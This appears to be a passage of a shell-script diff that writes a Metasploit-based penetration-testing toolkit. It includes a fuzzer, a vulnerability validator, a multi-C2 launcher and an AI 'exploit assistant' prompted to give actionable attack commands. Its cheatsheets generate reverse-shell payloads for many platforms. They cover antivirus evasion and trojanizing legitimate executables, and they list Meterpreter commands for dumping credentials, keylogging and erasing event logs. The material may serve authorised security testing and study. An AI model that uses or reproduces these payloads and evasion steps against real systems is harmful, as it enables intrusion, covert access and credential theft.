+    case "${OS_FAMILY:-unknown}" in debian|redhat|arch|suse|termux) log "OS $OS_FAMILY supported" ;;
+        *) err "Unsupported OS: ${DISTRO_ID:-unknown}"; info "Supported: Debian/Ubuntu, Fedora/RHEL, Arch, SUSE, Termux"; return 1 ;; esac
+}
+
+check_arch() {
+    info "Architecture: ${ARCH:-unknown}"
+    case "${ARCH:-}" in x86_64|aarch64|arm64) log "Arch OK" ;;
+        *) warn "Unusual arch — some tools may not work" ;; esac
+}
+
+run_all_checks() {
+    local pass=0 fail=0
+    step "Pre-flight System Check"
+    check_os || ((fail++))
+    check_arch || ((fail++))
+    check_root
+    check_internet || ((fail++))
+    check_dependency git "$PKG_INSTALL_CMD git" && ((pass++)) || ((fail++))
+    check_dependency curl "$PKG_INSTALL_CMD curl" && ((pass++)) || ((fail++))
+    check_dependency ruby "$PKG_INSTALL_CMD ruby ruby-dev" && ((pass++)) || ((fail++))
+    check_dependency bundle "gem install bundler" && ((pass++)) || ((fail++))
+    check_dependency psql "$PKG_INSTALL_CMD postgresql" && ((pass++)) || ((fail++))
+    check_dependency gcc "$PKG_INSTALL_CMD build-essential" && ((pass++)) || ((fail++))
+    check_dependency nmap "$PKG_INSTALL_CMD nmap" && ((pass++)) || ((fail++))
+    echo ""
+    echo -e "  Results: ${GREEN}$pass PASS${NC} ${RED}$fail FAIL${NC}"
+    [[ $fail -eq 0 ]] || return 1
+}
+
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then run_all_checks; fi
+EOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # lib/deps.sh
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lib/deps.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Smart dependency installer for all supported distros
+# ==============================================================================
+set -euo pipefail
+script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+source "$script_dir/common.sh" 2>/dev/null || true
+source "$script_dir/env.sh" 2>/dev/null || true
+detect_all 2>/dev/null || true
+
+install_system_deps() {
+    step "Installing System Dependencies"
+    declare -A PKG_MAP
+    case "${OS_FAMILY:-debian}" in
+        debian)
+            PKG_MAP=([git]="git" [curl]="curl" [ruby]="ruby ruby-dev" [build]="build-essential"
+                [postgresql]="postgresql postgresql-contrib libpq-dev" [nmap]="nmap"
+                [libpcap]="libpcap-dev" [libsqlite]="libsqlite3-dev" [libxml]="libxml2-dev libxslt1-dev"
+                [libcurl]="libcurl4-openssl-dev" [pandoc]="pandoc texlive-latex-base wkhtmltopdf"
+                [docker]="docker.io docker-compose")
+            INSTALL_CMD="sudo apt-get install -y --no-install-recommends"
+            UPDATE_CMD="sudo apt-get update -qq" ;;
+        *)
+            INSTALL_CMD="$PKG_INSTALL_CMD"; UPDATE_CMD="" ;;
+    esac
+    [[ -n "${UPDATE_CMD:-}" ]] && $UPDATE_CMD 2>/dev/null || true
+    for key in git curl ruby build postgresql nmap libpcap libsqlite libxml libcurl; do
+        local pkgs="${PKG_MAP[$key]:-}"
+        [[ -z "$pkgs" ]] && { warn "No pkg map for $key"; continue; }
+        info "Installing $key: $pkgs"
+        $INSTALL_CMD $pkgs 2>/dev/null && log "$key done" || {
+            warn "Batch failed for $key — per-package fallback"
+            for p in $pkgs; do $INSTALL_CMD "$p" 2>/dev/null && log "  $p" || warn "  $p skipped"; done
+        }
+    done
+}
+
+install_ruby_gems() {
+    step "Ruby Gems"
+    for g in bundler pg activerecord; do
+        gem install "$g" 2>/dev/null && log "gem $g" || warn "gem $g failed"
+    done
+}
+
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then install_system_deps; install_ruby_gems; fi
+EOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # lib/root-bridge.sh
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lib/root-bridge.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Root/non-root bridge — safe sudo execution, user creation, PG fix
+# ==============================================================================
+script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+source "$script_dir/common.sh" 2>/dev/null || true
+
+run_as_root() {
+    local cmd="$1"
+    case "$(user_mode)" in root) eval "$cmd" ;;
+        sudo) eval "sudo $cmd" ;;
+        normal) eval "$cmd" 2>/dev/null || { err "This command requires root/sudo: $cmd"; return 1; } ;;
+    esac
+}
+
+bridge_check() {
+    if is_root; then
+        warn "PostgreSQL initdb refuses to run as root"
+        info "Create normal user & re-run: useradd -m -s /bin/bash msfuser && su - msfuser"
+        if ask_yesno "Create user 'msfuser' now?" "y"; then
+            useradd -m -s /bin/bash msfuser 2>/dev/null && log "User msfuser created" || warn "User may already exist"
+            info "Switch: su - msfuser && cd $(pwd) && bash setup-metasploit.sh"
+            exit 0
+        fi
+    fi
+}
+
+bridge_create_user() {
+    local u="${1:-msfuser}"
+    is_root || { err "Need root to create user"; return 1; }
+    id "$u" &>/dev/null && { log "User $u exists"; return 0; }
+    useradd -m -s /bin/bash "$u" && log "Created $u" || { err "Failed"; return 1; }
+    cp -r "$(pwd)" "/home/$u/" 2>/dev/null && chown -R "$u:$u" "/home/$u/$(basename "$(pwd)")" 2>/dev/null
+    info "su - $u && cd $(basename "$(pwd)") && bash setup-metasploit.sh"
+}
+
+bridge_fix_pg_perms() {
+    local data="${1:-$HOME/.msf4/postgres}"
+    [[ -f "$data/PG_VERSION" ]] || return 0
+    local owner; owner=$(stat -c '%U' "$data" 2>/dev/null || echo "")
+    [[ "$owner" == "root" ]] && ! is_root && { warn "PG owned by root — fixing"; sudo chown -R "$(whoami):" "$data"; log "Fixed"; }
+}
+
+bridge_all() { bridge_check; bridge_fix_pg_perms; }
+EOF
+
+    log "lib/*.sh (5 files) written"
+
+    # ──────────────────────────────────────────────────────────────────
+    # lib/fuzzer.sh (NEW) — HTTP Parameter Fuzzing Engine
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lib/fuzzer.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: HTTP parameter fuzzing engine for vulnerability discovery
+# ==============================================================================
+target="${1:-}"; param="${2:-id}"; wordlist="${3:-/usr/share/seclists/Discovery/Web-Content/common.txt}"
+[[ -z "$target" ]] && { echo "Usage: bash fuzzer.sh <URL> [param] [wordlist]"; echo "  Example: bash fuzzer.sh http://target.com/page.php?id=FUZZ id /path/to/wordlist.txt"; exit 1; }
+
+fuzz_http_param() {
+    local t="$1" p="$2" w="$3"
+    echo -e "\n=== FUZZING $t?$p=FUZZ ===\n"
+    if cmd_exists ffuf; then
+        ffuf -u "${t}?${p}=FUZZ" -w "$w" -fc 404 -t 100 -o /tmp/ffuf_results.json 2>/dev/null
+        log "Results: /tmp/ffuf_results.json"
+    elif cmd_exists wfuzz; then
+        wfuzz -c -z file,"$w" --hc 404 "${t}?${p}=FUZZ"
+    elif cmd_exists gobuster; then
+        gobuster fuzz -u "${t}?${p}=FUZZ" -w "$w" --exclude-length 0
+    else
+        warn "No fuzzer found (ffuf/wfuzz/gobuster). Install one: go install github.com/ffuf/ffuf/v2@latest"
+    fi
+}
+
+fuzz_http_multipart() {
+    local t="$1" w="$2"
+    echo -e "\n=== MULTIPART FUZZING $t ===\n"
+    cmd_exists ffuf && ffuf -u "$t" -w "$w" -H "Content-Type: multipart/form-data" -d "file=FUZZ" -fc 404 -t 50
+}
+
+fuzz_http_headers() {
+    local t="$1" w="${2:-/usr/share/seclists/Discovery/Web-Content/common.txt}"
+    echo -e "\n=== HEADER FUZZING $t ===\n"
+    cmd_exists ffuf && ffuf -u "$t" -w "$w" -H "FUZZ: test" -fc 404 -t 50
+}
+
+# Auto-run if args provided
+[[ -n "$target" ]] && fuzz_http_param "$target" "$param" "$wordlist"
+EOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # lib/validator.sh (NEW — Feature 19) — True Positive Validation
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lib/validator.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Automated vulnerability validator — confirms true/false positives
+# ==============================================================================
+ip="${1:-}"; port="${2:-}"; cve="${3:-}"; outfile="${4:-validated_findings.json}"
+[[ -z "$ip" ]] && { echo "Usage: bash validator.sh <IP> [port] [CVE]"; exit 1; }
+
+validate_finding() {
+    local host="$1" p="$2" vuln="${3:-unknown}"
+    local status="UNVERIFIED" evidence=""
+    echo -e "\n=== VALIDATING $host:$p ($vuln) ===\n"
+
+    # SMB MS17-010 check
+    if [[ "$vuln" =~ MS17-010|ms17_010|eternalblue ]]; then
+        info "Checking MS17-010..."
+        if nmap --script smb-vuln-ms17-010 -p "$p" "$host" 2>/dev/null | grep -qi "VULNERABLE"; then
+            status="CONFIRMED"; evidence="nmap smb-vuln-ms17-010 returned VULNERABLE"
+        else
+            msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $host; run; exit" 2>/dev/null | grep -qi "vulnerable" && { status="CONFIRMED"; evidence="msf smb_ms17_010 detected"; } || status="FALSE_POSITIVE"
+        fi
+    fi
+
+    # BlueKeep check
+    if [[ "$vuln" =~ CVE-2019-0708|BlueKeep|bluekeep ]]; then
+        info "Checking BlueKeep..."
+        if nmap --script rdp-vuln-ms12-020 -p "$p" "$host" 2>/dev/null | grep -qi "VULNERABLE"; then
+            status="CONFIRMED"; evidence="nmap rdp check"
+        else
+            msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS $host; run; exit" 2>/dev/null | grep -qi "vulnerable" && { status="CONFIRMED"; evidence="msf bluekeep check"; } || status="FALSE_POSITIVE"
+        fi
+    fi
+
+    # HTTP CVE check
+    if [[ "$vuln" =~ CVE-|http ]]; then
+        info "Nuclei check..."
+        nuclei -u "${host}:${p}" -t cves/ -silent 2>/dev/null | head -5 && { status="CONFIRMED"; evidence="nuclei detection"; } || status="FALSE_POSITIVE"
+    fi
+
+    # Write JSON
+    mkdir -p "$(dirname "$outfile")" 2>/dev/null
+    echo "{\"host\":\"$host\",\"port\":\"$p\",\"cve\":\"$vuln\",\"status\":\"$status\",\"evidence\":\"$evidence\",\"time\":\"$(date -Iseconds)\"}" >> "$outfile"
+    echo ""
+    echo -e "  Result: ${BOLD}$status${NC}"
+    [[ "$status" == "CONFIRMED" ]] || [[ "$status" == "UNVERIFIED" ]]
+}
+
+validate_finding "$ip" "$port" "$cve"
+EOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # lib/llm_helper.sh (NEW — Feature 24) — AI Assistant
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lib/llm_helper.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: LLM Exploit Assistant — Ollama or OpenAI for pentest guidance
+# ==============================================================================
+source "${BASH_SOURCE[0]%/*}/common.sh" 2>/dev/null || true
+
+OPENAI_API_KEY="${OPENAI_API_KEY:-}"; OLLAMA_MODEL="${OLLAMA_MODEL:-llama3}"
+
+ask_ai() {
+    local question="${*:-}"
+    [[ -z "$question" ]] && { read -r -p "  [?] Your question: " question; }
+    local ctx="Target OS: ${TARGET_OS:-unknown}, Ports: ${TARGET_PORTS:-unknown}, Service: ${TARGET_SVC:-unknown}"
+    local full_q="$ctx — $question"
+
+    if cmd_exists ollama && ollama list 2>/dev/null | grep -q "$OLLAMA_MODEL"; then
+        echo -e "\n  ${BLUE}[AI-Ollama]${NC} Asking $OLLAMA_MODEL..."
+        ollama run "$OLLAMA_MODEL" "$full_q" 2>/dev/null || warn "Ollama error"
+    elif [[ -n "$OPENAI_API_KEY" ]]; then
+        echo -e "\n  ${BLUE}[AI-OpenAI]${NC} Querying GPT-4o-mini..."
+        local resp; resp=$(curl -s https://api.openai.com/v1/chat/completions \
+            -H "Content-Type: application/json" \
+            -H "Authorization: Bearer $OPENAI_API_KEY" \
+            -d "{\"model\":\"gpt-4o-mini\",\"messages\":[{\"role\":\"system\",\"content\":\"You are a pentest assistant. Give direct, actionable commands.\"},{\"role\":\"user\",\"content\":\"$full_q\"}]}" 2>/dev/null)
+        echo "$resp" | python3 -c "import sys,json;print(json.load(sys.stdin)['choices'][0]['message']['content'])" 2>/dev/null || warn "OpenAI parse failed"
+    else
+        warn "No AI backend. Install Ollama or set OPENAI_API_KEY in config.env"
+        info "Install Ollama: curl -fsSL https://ollama.com/install.sh | sh && ollama pull llama3"
+    fi
+}
+EOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # lib/external_api.sh (NEW — Feature 29) — VirusTotal, Shodan, Censys
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lib/external_api.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: External API integrations — VirusTotal, Shodan, NVD, Censys
+# ==============================================================================
+VT_API_KEY="${VT_API_KEY:-}"; SHODAN_API_KEY="${SHODAN_API_KEY:-}"
+CENSYS_UID="${CENSYS_UID:-}"; CENSYS_SECRET="${CENSYS_SECRET:-}"
+
+check_virustotal() {
+    local ip="${1:-}"; [[ -z "$ip" || -z "$VT_API_KEY" ]] && { warn "Need IP and VT_API_KEY"; return 1; }
+    echo -e "\n=== VirusTotal: $ip ===\n"
+    curl -s "https://www.virustotal.com/api/v3/ip_addresses/$ip" \
+        -H "x-apikey: $VT_API_KEY" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30
+}
+
+check_shodan() {
+    local ip="${1:-}"; [[ -z "$ip" || -z "$SHODAN_API_KEY" ]] && { warn "Need IP and SHODAN_API_KEY"; return 1; }
+    echo -e "\n=== Shodan: $ip ===\n"
+    curl -s "https://api.shodan.io/shodan/host/$ip?key=$SHODAN_API_KEY" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30
+}
+
+check_nvd() {
+    local cve="${1:-}"; [[ -z "$cve" ]] && { warn "Need CVE ID (e.g. CVE-2021-4034)"; return 1; }
+    echo -e "\n=== NVD: $cve ===\n"
+    curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=$cve" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30
+}
+
+check_censys() {
+    local ip="${1:-}"; [[ -z "$ip" || -z "$CENSYS_UID" ]] && { warn "Need IP and CENSYS_UID/CENSYS_SECRET"; return 1; }
+    echo -e "\n=== Censys: $ip ===\n"
+    curl -s -u "${CENSYS_UID}:${CENSYS_SECRET}" "https://search.censys.io/api/v2/hosts/$ip" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30
+}
+EOF
+    log "lib/*.sh (4 NEW files): fuzzer, validator, llm_helper, external_api"
+
+
+    # ──────────────────────────────────────────────────────────────────
+    # cheatsheets/msf-commands.sh — Complete msfconsole reference
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/cheatsheets/msf-commands.sh" << 'CMDSHEOF'
+#!/usr/bin/env bash
+# Description: Complete msfconsole command reference
+# ==============================================================================
+cat << 'REF'
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                    METASPLOIT QUICK COMMAND REFERENCE                       ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║  CORE COMMANDS                                                              ║
+║  ? / help          → Help menu                                             ║
+║  search <term>     → Find modules (search scanner/smb, search eternalblue) ║
+║  use <module>      → Select module                                         ║
+║  show options      → Show configurable parameters                          ║
+║  set <OPT> <val>   → Set parameter (set RHOSTS 10.0.0.5)                  ║
+║  setg <OPT> <val>  → Set GLOBAL parameter (setg LHOST 192.168.1.100)     ║
+║  unset <OPT>       → Clear a parameter                                    ║
+║  run / exploit     → Execute module                                        ║
+║  back              → Return from module context                            ║
+║  info <module>     → Module description                                    ║
+║  favorite <mod>    → Bookmark module                                       ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║  DATABASE COMMANDS                                                          ║
+║  db_status         → Check DB connection                                   ║
+║  workspace -a <n>  → Create workspace (workspace -a pentest_2026)          ║
+║  workspace <n>     → Switch workspace                                      ║
+║  workspace -d <n>  → Delete workspace                                      ║
+║  db_nmap -sS -T4 <target> → Nmap + auto-import                            ║
+║  db_import <file>  → Import scan (XML/Nessus/OpenVAS)                     ║
+║  hosts             → List discovered hosts                                 ║
+║  services           → List discovered services                              ║
+║  vulns              → List vulnerabilities                                  ║
+║  loot               → List collected loot                                   ║
+║  creds              → List stored credentials                               ║
+║  notes              → View/add notes                                        ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║  SESSION MANAGEMENT                                                         ║
+║  sessions -l       → List all active sessions                              ║
+║  sessions -i <N>   → Interact with session N                               ║
+║  sessions -k <N>   → Kill session N                                        ║
+║  sessions -u <N>   → Upgrade shell to meterpreter                          ║
+║  background        → Background current session                            ║
+║  jobs -l           → List running jobs                                     ║
+║  jobs -k <J>       → Kill job J                                            ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║  METERPRETER COMMANDS                                                       ║
+║  sysinfo           → OS, hostname, arch                                    ║
+║  getuid            → Current user identity                                 ║
+║  getprivs          → Current privileges                                    ║
+║  getsystem         → Auto privilege escalation                             ║
+║  ps                → Process list                                          ║
+║  migrate <PID>     → Move meterpreter to PID                               ║
+║  shell             → Drop to cmd.exe / /bin/sh                            ║
+║  upload <src> <dst>→ Upload file                                           ║
+║  download <src> <dst>→ Download file                                       ║
+║  hashdump          → Dump SAM hashes                                       ║
+║  load kiwi         → Load Mimikatz                                         ║
+║  creds_all         → Dump all credentials                                   ║
+║  lsa_dump_sam      → Dump SAM                                              ║
+║  lsa_dump_secrets  → Dump LSA secrets                                      ║
+║  screenshot        → Capture screen                                        ║
+║  keyscan_start     → Start keylogger                                       ║
+║  keyscan_dump      → Dump keystrokes                                       ║
+║  clearev           → Clear Windows event logs                              ║
+║  portfwd add -l <lp> -p <rp> -r <tip> → Port forward                       ║
+║  route add <subnet> <mask> <sid> → Pivot through session                   ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║  MSFVENOM QUICK                                                             ║
+║  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444    ║
+║           -f exe -o payload.exe                                             ║
+║  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444       ║
+║           -f elf -o payload.elf                                             ║
+║  msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444             ║
+║           -f raw -o shell.php                                               ║
+║  msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444         ║
+║           -o payload.apk                                                    ║
+║  msfvenom -e x86/shikata_ga_nai -i 3 → Encode (AV evasion)                 ║
+║  msfvenom -l payloads    → List ALL payloads                               ║
+║  msfvenom -l encoders    → List ALL encoders                               ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║  KEY EXPLOITS (quick access)                                                ║
+║  exploit/windows/smb/ms17_010_eternalblue        # EternalBlue             ║
+║  exploit/windows/rdp/cve_2019_0708_bluekeep_rce   # BlueKeep               ║
+║  exploit/windows/smb/ms08_067_netapi               # MS08-067               ║
+║  exploit/windows/smb/psexec                        # PsExec                  ║
+║  exploit/linux/ssh/ssh_login                       # SSH brute               ║
+║  exploit/multi/http/php_cgi_arg_injection          # PHP CGI                 ║
+║  exploit/multi/handler                             # Reverse handler         ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+REF
+CMDSHEOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # cheatsheets/payloads.sh — msfvenom payload generator
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/cheatsheets/payloads.sh" << 'PAYEOF'
+#!/usr/bin/env bash
+# Description: msfvenom payload generator — all platforms with AV evasion
+# ==============================================================================
+LHOST="${1:-}"; LPORT="${2:-4444}"
+[[ -z "$LHOST" ]] && { echo "Usage: bash payloads.sh <LHOST> [LPORT]"; echo "  Example: bash payloads.sh 192.168.1.100 4444"; exit 1; }
+echo -e "\n=== PAYLOAD GENERATOR — LHOST=$LHOST LPORT=$LPORT ===\n"
+cat << EOF
+
+── Windows Payloads ──────────────────────────────────────────────────────────
+  # Standard EXE:
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o reverse_tcp.exe
+
+  # HTTPS EXE (bypass some AV):
+  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=443 -f exe -o reverse_https.exe
+
+  # DLL:
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f dll -o payload.dll
+
+  # PowerShell (fileless):
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f psh -o payload.ps1
+
+  # Shellcode (C buffer):
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f c
+
+  # Encoded (Shikata Ga Nai):
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
+
+── Linux Payloads ────────────────────────────────────────────────────────────
+  # ELF Binary:
+  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o linux_reverse_tcp.elf
+
+  # Bash one-liner:
+  msfvenom -p cmd/unix/reverse_bash LHOST=${LHOST} LPORT=${LPORT} -f raw
+
+  # Python reverse shell:
+  msfvenom -p cmd/unix/reverse_python LHOST=${LHOST} LPORT=${LPORT} -f raw
+
+── Web Payloads ──────────────────────────────────────────────────────────────
+  # PHP:
+  msfvenom -p php/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.php
+
+  # JSP (Tomcat):
+  msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.jsp
+
+  # WAR deploy:
+  msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war -o shell.war
+
+  # ASP (IIS):
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f asp -o shell.asp
+
+── Android Payloads ──────────────────────────────────────────────────────────
+  msfvenom -p android/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -o android_payload.apk
+
+── Listener Setup (msfconsole) ───────────────────────────────────────────────
+  use exploit/multi/handler
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  set LHOST ${LHOST}
+  set LPORT ${LPORT}
+  exploit -j
+
+── AV Evasion Techniques ─────────────────────────────────────────────────────
+  # Encoder chain:
+  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=443 -e x64/xor_dynamic -i 5 -f exe-only -o stealth.exe
+
+  # Template injection:
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -x /path/to/legit.exe -k -f exe -o trojanized.exe
+
+  # Service EXE:
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe-service -o service.exe
+
+  # RC4 encryption:
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} --encrypt rc4 --encrypt-key SecretK3y -f exe -o rc4_payload.exe
+PAYEOF
+    log "cheatsheets/ written (2 files)"
+
+
+    # ──────────────────────────────────────────────────────────────────
+    # msf-run.sh — Dynamic module executor (Feature 12: auto-discover)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/msf-run.sh" << 'MRUNEOF'
+#!/usr/bin/env bash
+# Description: Dynamic module executor — auto-discovers ALL modules via find
+# ==============================================================================
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+cd "$SCRIPT_DIR"; source "$SCRIPT_DIR/lib/common.sh" 2>/dev/null || true
+
+banner() {
+    echo -e "\n${RED}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${RED}${BOLD}║  METASPLOIT FRAMEWORK — Module Executor & Toolkit           ║${NC}"
+    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}\n"
+}
+
+list_available_modules() {
+    echo -e "\n${BOLD}Available Modules (auto-discovered):${NC}\n"
+    for cat_dir in "$SCRIPT_DIR"/modules/*/; do
+        [[ -d "$cat_dir" ]] || continue
+        local cat; cat="$(basename "$cat_dir")"
+        local count; count=$(find "$cat_dir" -type f -name '*.sh' 2>/dev/null | wc -l)
+        echo -e "  ${CYAN}$cat${NC} — $count modules"
+        for sub in "$cat_dir"*/; do
+            [[ -d "$sub" ]] || continue
+            local sub_name; sub_name="$(basename "$sub")"
+            for f in "$sub"*.sh; do
+                [[ -f "$f" ]] || continue
+                local fn; fn="$(basename "$f")"
+                local desc; desc=$(head -20 "$f" 2>/dev/null | grep '^# Description:' | head -1 | cut -d: -f2- | sed 's/^ *//')
+                [[ -z "$desc" ]] && desc="$(head -3 "$f" | grep '^# ' | head -1 | sed 's/^# *//')"
+                echo -e "    ${GREEN}$sub_name/$fn${NC} — ${desc:-module}"
+            done
+        done
+    done
+    echo ""
+}
+
+run_module() {
+    local path="${1:-}"
+    [[ -z "$path" ]] && { err "Usage: bash msf-run.sh module <category>/<sub>/<name>"; return 1; }
+    # Support: module category/sub/file, modules/category/sub/file.sh, etc.
+    local full="$SCRIPT_DIR/modules/$path"
+    [[ -f "$full.sh" ]] && full="$full.sh"
+    [[ -f "$full" ]] || { full="$SCRIPT_DIR/$path"; }
+    [[ -f "$full.sh" ]] && full="$full.sh"
+    if [[ -f "$full" ]]; then
+        step "Running: $path"
+        bash "$full" "${@:2}"
+    else
+        err "Module not found: $path (tried: $full)"
+        info "Browse: bash msf-run.sh modules"
+        return 1
+    fi
+}
+
+case "${1:-menu}" in
+    modules|browse|list) list_available_modules ;;
+    module) run_module "${2:-}" "${@:3}" ;;
+    menu|"")
+        banner; echo -e "  ${CYAN}bash msf-run.sh modules${NC}  — Browse all modules"
+        echo -e "  ${CYAN}bash msf-run.sh module <path>${NC} — Run specific module"
+        echo -e "  ${CYAN}bash msf-run.sh module scanner/smb/smb_scanner 192.168.1.0/24${NC}"; echo "" ;;
+    *) run_module "$@" ;;
+esac
+MRUNEOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # c2-run.sh — Multi-C2 executor (Feature 20)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/c2-run.sh" << 'C2REOF'
+#!/usr/bin/env bash
+# Description: Multi-C2 Launcher — Metasploit, Sliver, Havoc, Mythic
+# ==============================================================================
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+source "$SCRIPT_DIR/lib/common.sh" 2>/dev/null || true
+
+show_c2_menu() {
+    echo -e "\n${RED}${BOLD}=== MULTI-C2 COMMAND CENTER ===${NC}\n"
+    echo -e "  ${GREEN}1)${NC} Metasploit  — msfconsole"
+    echo -e "  ${GREEN}2)${NC} Sliver      — sliver-client"
+    echo -e "  ${GREEN}3)${NC} Havoc       — havoc-client"
+    echo -e "  ${GREEN}4)${NC} Mythic      — mythic-cli"
+    echo -e "  ${GREEN}5)${NC} Dashboard   — http://localhost:8080"
+    echo ""
+    local c; read -r -p "  [?] Select C2 (1-5): " c
+    case "$c" in
+        1)
+            cmd_exists msfconsole && msfconsole || { err "msfconsole not installed"; bash "$SCRIPT_DIR/setup-metasploit.sh"; }
+            ;;
+        2)
+            [[ -f "$SCRIPT_DIR/modules/c2/sliver_setup.sh" ]] && bash "$SCRIPT_DIR/modules/c2/sliver_setup.sh"
+            ;;
+        3)
+            [[ -f "$SCRIPT_DIR/modules/c2/havoc_setup.sh" ]] && bash "$SCRIPT_DIR/modules/c2/havoc_setup.sh"
+            ;;
+        4)
+            [[ -f "$SCRIPT_DIR/modules/c2/mythic_setup.sh" ]] && bash "$SCRIPT_DIR/modules/c2/mythic_setup.sh"
+            ;;
+        5)
+            info "Dashboard: http://localhost:8080"
+            ;;
+        *) warn "Invalid" ;;
+    esac
+}
+
+case "${1:-}" in
+    --c2|--c2-select) shift; show_c2_menu ;;
+    menu|"") show_c2_menu ;;
+    *) warn "Unknown: $1. Try: bash c2-run.sh"; show_c2_menu ;;
+esac
+C2REOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # msf-ai.sh — AI Assistant entry point (Feature 24)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/msf-ai.sh" << 'AIEOF'
+#!/usr/bin/env bash
+# Description: AI Pentest Assistant — Ollama/OpenAI powered
+# ==============================================================================
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+source "$SCRIPT_DIR/lib/llm_helper.sh" 2>/dev/null || {
+    echo "Cannot load llm_helper.sh — AI backend not available"
+    exit 1
+}
+question="${*:-}"
+echo -e "\n${BOLD}=== AI PENTEST ASSISTANT ===${NC}\n"
+[[ -z "$question" ]] && {
+    echo "Examples:"
+    echo "  bash msf-ai.sh 'How to privesc on Linux kernel 5.10?'"
+    echo "  bash msf-ai.sh 'Best EternalBlue alternatives if patched?'"
+    echo "  bash msf-ai.sh 'How to pivot from DMZ to internal network?'"
+    echo ""
+    read -r -p "  [?] Your question: " question
+}
+ask_ai "$question"
+AIEOF
+
+    # ──────────────────────────────────────────────────────────────────
+    # msf-cheatsheet.sh — Quick reference (standalone)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/msf-cheatsheet.sh" << 'CHTEOMAIN'
+#!/usr/bin/env bash
+# Description: Metasploit Quick Reference — Recon, Exploit, Post-Exploit
+# ==============================================================================
+RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
+echo -e "${RED}${BOLD}=== METASPLOIT QUICK REFERENCE ===${NC}\n"
+bash "${BASH_SOURCE[0]%/*}/cheatsheets/msf-commands.sh" 2>/dev/null || cat << 'CHEAT'
+── RECON ──
+  db_nmap -sS -T4 192.168.1.0/24     # Quick scan + DB import
+  db_nmap -p- -sV -O target           # Full scan
